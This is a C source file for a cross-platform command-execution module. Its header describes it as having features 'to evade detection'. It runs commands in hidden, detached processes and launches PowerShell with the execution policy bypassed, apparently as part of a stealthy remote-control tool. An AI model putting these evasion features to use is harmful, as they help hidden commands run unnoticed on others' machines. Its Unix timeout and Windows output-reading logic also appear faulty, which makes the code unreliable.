/**
 * @file command_executor.c
 * @brief Implementation of the command execution module.
 * @author iamtomasanderson@gmail.com
 * @date 2023-09-04
 * 
 * This module provides functionality for executing system commands with various 
 * options and security features to evade detection.
 */

#include "../include/command_executor.h"
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <time.h>

#ifdef _WIN32
#include <windows.h>
#include <process.h>
#else
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#endif

#define MAX_ERROR_MSG_LENGTH 256

// Error handling
static int last_error = 0;
static char error_message[MAX_ERROR_MSG_LENGTH] = {0};

// Set error info
static void set_error(int error_code, const char* message) {
    last_error = error_code;
    if (message) {
        strncpy(error_message, message, MAX_ERROR_MSG_LENGTH - 1);
        error_message[MAX_ERROR_MSG_LENGTH - 1] = '\0';
    } else {
        error_message[0] = '\0';
    }
}

// Allocate and copy a string
static char* copy_string(const char* str) {
    if (!str) return NULL;
    
    char* result = (char*)malloc(strlen(str) + 1);
    if (result) {
        strcpy(result, str);
    }
    return result;
}

int command_executor_init(void) {
    // Initialize random seed for randomizing behaviors
    srand((unsigned int)time(NULL));
    return 1;
}

Command* command_create(CommandType type) {
    Command* cmd = (Command*)calloc(1, sizeof(Command));
    if (!cmd) {
        set_error(1, "Failed to allocate memory for command");
        return NULL;
    }
    
    cmd->type = type;
    cmd->status = COMMAND_STATUS_CREATED;
    return cmd;
}

int command_set_command_line(Command* cmd, const char* command_line) {
    if (!cmd || !command_line) {
        set_error(2, "Invalid command or command line");
        return 0;
    }
    
    free(cmd->command_line);
    cmd->command_line = copy_string(command_line);
    if (!cmd->command_line) {
        set_error(3, "Failed to allocate memory for command line");
        return 0;
    }
    
    return 1;
}

int command_set_working_dir(Command* cmd, const char* working_dir) {
    if (!cmd) {
        set_error(2, "Invalid command");
        return 0;
    }
    
    free(cmd->working_dir);
    if (working_dir) {
        cmd->working_dir = copy_string(working_dir);
        if (!cmd->working_dir) {
            set_error(3, "Failed to allocate memory for working directory");
            return 0;
        }
    } else {
        cmd->working_dir = NULL;
    }
    
    return 1;
}

int command_set_output_file(Command* cmd, const char* output_file) {
    if (!cmd) {
        set_error(2, "Invalid command");
        return 0;
    }
    
    free(cmd->output_file);
    if (output_file) {
        cmd->output_file = copy_string(output_file);
        if (!cmd->output_file) {
            set_error(3, "Failed to allocate memory for output file");
            return 0;
        }
    } else {
        cmd->output_file = NULL;
    }
    
    return 1;
}

int command_set_input_data(Command* cmd, const void* input_data, size_t input_length) {
    if (!cmd) {
        set_error(2, "Invalid command");
        return 0;
    }
    
    free(cmd->input_data);
    if (input_data && input_length > 0) {
        cmd->input_data = malloc(input_length);
        if (!cmd->input_data) {
            set_error(3, "Failed to allocate memory for input data");
            cmd->input_length = 0;
            return 0;
        }
        memcpy(cmd->input_data, input_data, input_length);
        cmd->input_length = input_length;
    } else {
        cmd->input_data = NULL;
        cmd->input_length = 0;
    }
    
    return 1;
}

int command_set_flags(Command* cmd, unsigned int flags) {
    if (!cmd) {
        set_error(2, "Invalid command");
        return 0;
    }
    
    cmd->flags = flags;
    return 1;
}

int command_set_timeout(Command* cmd, unsigned int timeout_ms) {
    if (!cmd) {
        set_error(2, "Invalid command");
        return 0;
    }
    
    cmd->timeout_ms = timeout_ms;
    return 1;
}

#ifdef _WIN32
// Windows implementation
static CommandResult* execute_windows_command(Command* cmd) {
    CommandResult* result = (CommandResult*)calloc(1, sizeof(CommandResult));
    if (!result) {
        set_error(3, "Failed to allocate memory for command result");
        return NULL;
    }
    
    result->status = COMMAND_STATUS_FAILED;
    
    if (!cmd->command_line) {
        set_error(2, "No command line specified");
        return result;
    }
    
    SECURITY_ATTRIBUTES sa = {0};
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    
    HANDLE stdout_read = NULL;
    HANDLE stdout_write = NULL;
    HANDLE stdin_read = NULL;
    HANDLE stdin_write = NULL;
    
    // Create pipes for stdout
    if (!(cmd->flags & COMMAND_FLAG_NO_OUTPUT)) {
        if (!CreatePipe(&stdout_read, &stdout_write, &sa, 0)) {
            set_error(4, "Failed to create stdout pipe");
            goto cleanup;
        }
        SetHandleInformation(stdout_read, HANDLE_FLAG_INHERIT, 0);
    }
    
    // Create pipes for stdin if we have input data
    if (cmd->input_data && cmd->input_length > 0) {
        if (!CreatePipe(&stdin_read, &stdin_write, &sa, 0)) {
            set_error(4, "Failed to create stdin pipe");
            goto cleanup;
        }
        SetHandleInformation(stdin_write, HANDLE_FLAG_INHERIT, 0);
    }
    
    // Setup process info
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    
    si.cb = sizeof(STARTUPINFO);
    si.dwFlags |= STARTF_USESTDHANDLES;
    si.hStdError = stdout_write;
    si.hStdOutput = stdout_write;
    si.hStdInput = stdin_read;
    
    if (cmd->flags & COMMAND_FLAG_HIDDEN) {
        si.dwFlags |= STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
    }
    
    // Creation flags
    DWORD creation_flags = 0;
    if (cmd->flags & COMMAND_FLAG_DETACHED) {
        creation_flags |= DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP;
    }
    
    // Prepare command based on type
    char* command_to_execute = NULL;
    
    switch (cmd->type) {
        case COMMAND_TYPE_SHELL:
            {
                const char* shell_prefix = "cmd.exe /c ";
                command_to_execute = (char*)malloc(strlen(shell_prefix) + strlen(cmd->command_line) + 1);
                if (!command_to_execute) {
                    set_error(3, "Failed to allocate memory for shell command");
                    goto cleanup;
                }
                sprintf(command_to_execute, "%s%s", shell_prefix, cmd->command_line);
            }
            break;
            
        case COMMAND_TYPE_POWERSHELL:
            {
                const char* ps_prefix = "powershell.exe -ExecutionPolicy Bypass -Command \"";
                const char* ps_suffix = "\"";
                command_to_execute = (char*)malloc(strlen(ps_prefix) + strlen(cmd->command_line) + strlen(ps_suffix) + 1);
                if (!command_to_execute) {
                    set_error(3, "Failed to allocate memory for PowerShell command");
                    goto cleanup;
                }
                sprintf(command_to_execute, "%s%s%s", ps_prefix, cmd->command_line, ps_suffix);
            }
            break;
            
        case COMMAND_TYPE_PROCESS:
            command_to_execute = copy_string(cmd->command_line);
            break;
    }
    
    if (!command_to_execute) {
        set_error(3, "Failed to prepare command line");
        goto cleanup;
    }
    
    // Update command status
    cmd->status = COMMAND_STATUS_RUNNING;
    result->start_time = time(NULL);
    
    // Execute the command
    if (!CreateProcess(
        NULL,                   // No module name (use command line)
        command_to_execute,     // Command line
        NULL,                   // Process handle not inheritable
        NULL,                   // Thread handle not inheritable
        TRUE,                   // Inherit handles
        creation_flags,         // Creation flags
        NULL,                   // Use parent's environment block
        cmd->working_dir,       // Working directory
        &si,                    // Startup info
        &pi                     // Process information
    )) {
        set_error(5, "Failed to create process");
        free(command_to_execute);
        goto cleanup;
    }
    
    free(command_to_execute);
    
    // Close handles we don't need anymore
    if (stdout_write) {
        CloseHandle(stdout_write);
        stdout_write = NULL;
    }
    
    if (stdin_read) {
        CloseHandle(stdin_read);
        stdin_read = NULL;
    }
    
    // Write input data if available
    if (cmd->input_data && cmd->input_length > 0 && stdin_write) {
        DWORD bytes_written = 0;
        WriteFile(stdin_write, cmd->input_data, (DWORD)cmd->input_length, &bytes_written, NULL);
        CloseHandle(stdin_write);
        stdin_write = NULL;
    }
    
    // Wait for process to complete or timeout
    DWORD wait_result = 0;
    if (cmd->timeout_ms > 0) {
        wait_result = WaitForSingleObject(pi.hProcess, cmd->timeout_ms);
        if (wait_result == WAIT_TIMEOUT) {
            cmd->status = COMMAND_STATUS_TIMEOUT;
            result->status = COMMAND_STATUS_TIMEOUT;
            TerminateProcess(pi.hProcess, 1);
        }
    } else {
        wait_result = WaitForSingleObject(pi.hProcess, INFINITE);
    }
    
    if (wait_result == WAIT_OBJECT_0) {
        DWORD exit_code = 0;
        GetExitCodeProcess(pi.hProcess, &exit_code);
        result->exit_code = (int)exit_code;
        
        // Read output if available
        if (stdout_read && !(cmd->flags & COMMAND_FLAG_NO_OUTPUT)) {
            char buffer[4096];
            DWORD bytes_read = 0;
            DWORD total_bytes = 0;
            BOOL success = FALSE;
            
            // First, calculate required buffer size
            do {
                success = PeekNamedPipe(stdout_read, NULL, 0, NULL, &bytes_read, NULL);
                if (!success || bytes_read == 0) break;
                total_bytes += bytes_read;
            } while (success);
            
            if (total_bytes > 0) {
                result->output = (char*)malloc(total_bytes + 1);
                if (result->output) {
                    char* current_pos = result->output;
                    DWORD bytes_remaining = total_bytes;
                    
                    do {
                        success = ReadFile(stdout_read, buffer, sizeof(buffer), &bytes_read, NULL);
                        if (!success || bytes_read == 0) break;
                        
                        memcpy(current_pos, buffer, bytes_read);
                        current_pos += bytes_read;
                        bytes_remaining -= bytes_read;
                    } while (success && bytes_remaining > 0);
                    
                    result->output[total_bytes] = '\0';
                    result->output_length = total_bytes;
                }
            }
        }
        
        cmd->status = COMMAND_STATUS_COMPLETED;
        result->status = COMMAND_STATUS_COMPLETED;
    } else {
        cmd->status = COMMAND_STATUS_ERROR;
        result->status = COMMAND_STATUS_ERROR;
    }
    
    result->end_time = time(NULL);
    
    // Cleanup process handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
cleanup:
    if (stdout_read) CloseHandle(stdout_read);
    if (stdout_write) CloseHandle(stdout_write);
    if (stdin_read) CloseHandle(stdin_read);
    if (stdin_write) CloseHandle(stdin_write);
    
    return result;
}
#else
// Linux/Unix implementation
static CommandResult* execute_unix_command(Command* cmd) {
    CommandResult* result = (CommandResult*)calloc(1, sizeof(CommandResult));
    if (!result) {
        set_error(3, "Failed to allocate memory for command result");
        return NULL;
    }
    
    result->status = COMMAND_STATUS_FAILED;
    
    if (!cmd->command_line) {
        set_error(2, "No command line specified");
        return result;
    }
    
    int stdout_pipe[2] = {-1, -1};
    int stdin_pipe[2] = {-1, -1};
    
    // Create pipes for stdout
    if (!(cmd->flags & COMMAND_FLAG_NO_OUTPUT)) {
        if (pipe(stdout_pipe) == -1) {
            set_error(4, "Failed to create stdout pipe");
            goto cleanup;
        }
    }
    
    // Create pipes for stdin if we have input data
    if (cmd->input_data && cmd->input_length > 0) {
        if (pipe(stdin_pipe) == -1) {
            set_error(4, "Failed to create stdin pipe");
            goto cleanup;
        }
    }
    
    // Update command status
    cmd->status = COMMAND_STATUS_RUNNING;
    result->start_time = time(NULL);
    
    // Fork the process
    pid_t pid = fork();
    
    if (pid == -1) {
        // Fork failed
        set_error(5, "Failed to fork process");
        goto cleanup;
    } else if (pid == 0) {
        // Child process
        
        // Setup stdout redirection
        if (!(cmd->flags & COMMAND_FLAG_NO_OUTPUT)) {
            close(stdout_pipe[0]); // Close read end
            dup2(stdout_pipe[1], STDOUT_FILENO);
            dup2(stdout_pipe[1], STDERR_FILENO);
            close(stdout_pipe[1]);
        }
        
        // Setup stdin redirection
        if (stdin_pipe[0] != -1) {
            close(stdin_pipe[1]); // Close write end
            dup2(stdin_pipe[0], STDIN_FILENO);
            close(stdin_pipe[0]);
        }
        
        // Change working directory if specified
        if (cmd->working_dir) {
            if (chdir(cmd->working_dir) == -1) {
                exit(127);
            }
        }
        
        // Detach process if requested
        if (cmd->flags & COMMAND_FLAG_DETACHED) {
            if (setsid() == -1) {
                exit(127);
            }
        }
        
        // Execute the command based on type
        if (cmd->type == COMMAND_TYPE_SHELL) {
            execl("/bin/sh", "sh", "-c", cmd->command_line, NULL);
        } else {
            // For COMMAND_TYPE_PROCESS, we need to parse the command line
            // This is a simplified version - a real implementation would be more robust
            char* args[64] = {0}; // Max 64 arguments
            char* cmd_copy = strdup(cmd->command_line);
            char* token = strtok(cmd_copy, " ");
            int i = 0;
            
            while (token != NULL && i < 63) {
                args[i++] = token;
                token = strtok(NULL, " ");
            }
            
            execvp(args[0], args);
            free(cmd_copy);
        }
        
        // If we get here, exec failed
        exit(127);
    }
    
    // Parent process
    
    // Close unused pipe ends
    if (stdout_pipe[1] != -1) {
        close(stdout_pipe[1]);
        stdout_pipe[1] = -1;
    }
    
    if (stdin_pipe[0] != -1) {
        close(stdin_pipe[0]);
        stdin_pipe[0] = -1;
    }
    
    // Write input data if available
    if (cmd->input_data && cmd->input_length > 0 && stdin_pipe[1] != -1) {
        write(stdin_pipe[1], cmd->input_data, cmd->input_length);
        close(stdin_pipe[1]);
        stdin_pipe[1] = -1;
    }
    
    // Wait for process to complete or timeout
    int status = 0;
    pid_t wait_result = 0;
    
    if (cmd->timeout_ms > 0) {
        // Setup timeout using alarm
        struct sigaction sa;
        memset(&sa, 0, sizeof(sa));
        sa.sa_handler = SIG_IGN;
        sigaction(SIGALRM, &sa, NULL);
        
        alarm(cmd->timeout_ms / 1000);
        wait_result = waitpid(pid, &status, 0);
        alarm(0);
        
        if (wait_result == -1 && errno == EINTR) {
            // Timeout occurred
            kill(pid, SIGTERM); // Try graceful termination
            usleep(100000); // Wait 100ms
            kill(pid, SIGKILL); // Force kill if still running
            waitpid(pid, &status, 0); // Clean up zombie
            
            cmd->status = COMMAND_STATUS_TIMEOUT;
            result->status = COMMAND_STATUS_TIMEOUT;
        }
    } else {
        wait_result = waitpid(pid, &status, 0);
    }
    
    if (wait_result != -1 && wait_result == pid) {
        if (WIFEXITED(status)) {
            result->exit_code = WEXITSTATUS(status);
            
            // Read output if available
            if (stdout_pipe[0] != -1 && !(cmd->flags & COMMAND_FLAG_NO_OUTPUT)) {
                char buffer[4096];
                ssize_t bytes_read = 0;
                size_t total_bytes = 0;
                size_t buffer_size = 4096;
                char* output_buffer = (char*)malloc(buffer_size);
                
                if (output_buffer) {
                    while ((bytes_read = read(stdout_pipe[0], buffer, sizeof(buffer))) > 0) {
                        if (total_bytes + bytes_read > buffer_size) {
                            buffer_size *= 2;
                            char* new_buffer = (char*)realloc(output_buffer, buffer_size);
                            if (!new_buffer) {
                                free(output_buffer);
                                output_buffer = NULL;
                                break;
                            }
                            output_buffer = new_buffer;
                        }
                        
                        memcpy(output_buffer + total_bytes, buffer, bytes_read);
                        total_bytes += bytes_read;
                    }
                    
                    if (output_buffer) {
                        result->output = (char*)realloc(output_buffer, total_bytes + 1);
                        if (result->output) {
                            result->output[total_bytes] = '\0';
                            result->output_length = total_bytes;
                        } else {
                            result->output = output_buffer;
                            result->output_length = total_bytes;
                        }
                    }
                }
            }
            
            cmd->status = COMMAND_STATUS_COMPLETED;
            result->status = COMMAND_STATUS_COMPLETED;
        } else if (WIFSIGNALED(status)) {
            cmd->status = COMMAND_STATUS_ERROR;
            result->status = COMMAND_STATUS_ERROR;
            result->exit_code = 128 + WTERMSIG(status);
        }
    } else {
        cmd->status = COMMAND_STATUS_ERROR;
        result->status = COMMAND_STATUS_ERROR;
    }
    
    result->end_time = time(NULL);
    
cleanup:
    if (stdout_pipe[0] != -1) close(stdout_pipe[0]);
    if (stdout_pipe[1] != -1) close(stdout_pipe[1]);
    if (stdin_pipe[0] != -1) close(stdin_pipe[0]);
    if (stdin_pipe[1] != -1) close(stdin_pipe[1]);
    
    return result;
}
#endif

CommandResult* command_execute(Command* cmd) {
    if (!cmd) {
        set_error(2, "Invalid command");
        return NULL;
    }
    
    if (!cmd->command_line) {
        set_error(2, "No command line specified");
        return NULL;
    }
    
#ifdef _WIN32
    return execute_windows_command(cmd);
#else
    return execute_unix_command(cmd);
#endif
}

int command_executor_get_last_error(void) {
    return last_error;
}

const char* command_executor_get_error_message(void) {
    return error_message;
}

void command_free(Command* cmd) {
    if (cmd) {
        free(cmd->command_line);
        free(cmd->working_dir);
        free(cmd->output_file);
        free(cmd->input_data);
        free(cmd);
    }
}

void command_result_free(CommandResult* result) {
    if (result) {
        free(result->output);
        free(result);
    }
}

void command_executor_cleanup(void) {
    // Reset error state
    last_error = 0;
    error_message[0] = '\0';
} 